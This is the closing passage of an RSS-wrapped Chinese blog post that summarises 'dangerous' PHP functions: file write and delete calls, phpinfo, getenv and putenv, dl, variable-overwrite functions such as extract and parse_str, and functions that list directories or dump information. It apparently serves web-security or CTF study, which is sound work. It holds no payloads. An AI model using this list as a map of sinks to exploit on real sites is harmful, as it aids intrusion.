&lt;li&gt;file_put_contents  将一个字符串写入文件  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtcHV0LWNvbnRlbnRzLnBocA==&#34;&gt;http://php.net/manual/zh/function.file-put-contents.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;file  把整个文件读入到一个数组中 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUucGhw&#34;&gt;http://php.net/manual/zh/function.file.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;fopen  打开文件或者 URL  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZvcGVuLnBocA==&#34;&gt;http://php.net/manual/zh/function.fopen.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;move_uploaded_file 将上传的文件移动到新位置 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLm1vdmUtdXBsb2FkZWQtZmlsZS5waHA=&#34;&gt;http://php.net/manual/zh/function.move-uploaded-file.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;readfile  输出文件 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlYWRmaWxlLnBocA==&#34;&gt;http://php.net/manual/zh/function.readfile.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;rename  重命名一个文件目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlbmFtZS5waHA=&#34;&gt;http://php.net/manual/zh/function.rename.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;rmdir  删除目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJtZGlyLnBocA==&#34;&gt;http://php.net/manual/zh/function.rmdir.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;unlink &amp;amp; delete  删除文件  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnVubGluay5waHA=&#34;&gt;http://php.net/manual/zh/function.unlink.php&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;特殊函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特殊函数&#34;&gt;#&lt;/a&gt; 特殊函数&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;phpinfo — 输出关于 PHP 配置的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;symlink — 建立符号连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readlink — 返回符号连接指向的目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getenv — 获取一个环境变量的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putenv — 设置环境变量的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dl — 运行时载入一个 PHP 扩展&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ini_get — 获取一个配置选项的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ini_set  ini_alter  ini_restore&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;is_numeric - 数字判断 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;in_array 在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;变量覆盖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#变量覆盖&#34;&gt;#&lt;/a&gt; 变量覆盖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;parse_str 如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。&lt;/li&gt;
&lt;li&gt;extract  本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。&lt;/li&gt;
&lt;li&gt;mb_parse_str  解析 GET/POST/COOKIE 数据并设置全局变量。&lt;/li&gt;
&lt;li&gt;import_request_variables  将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;列目录&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;glob&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt; glob ( &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt; [, &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flags&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; ] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般 shells 所用的规则一样。不进行缩写扩展或参数替代。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;无参数获取信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无参数获取信息&#34;&gt;#&lt;/a&gt; 无参数获取信息&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;get_defined_vars 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。&lt;/li&gt;
&lt;li&gt;get_defined_constants 返回当前所有已定义的常量名和值。 这包含 define () 函数所创建的，也包含了所有扩展所创建的。&lt;/li&gt;
&lt;li&gt;get_defined_functions 返回一个包含所有已定义函数列表的多维数组&lt;/li&gt;
&lt;li&gt;get_included_files 返回所有被 include、 include_once、 require 和 require_once 的文件名。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php 危险函数总结&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503135420288.png&#34; alt=&#34;image-20210503135420288&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503135446595.png&#34; alt=&#34;image-20210503135446595&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503135503196.png&#34; alt=&#34;image-20210503135503196&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
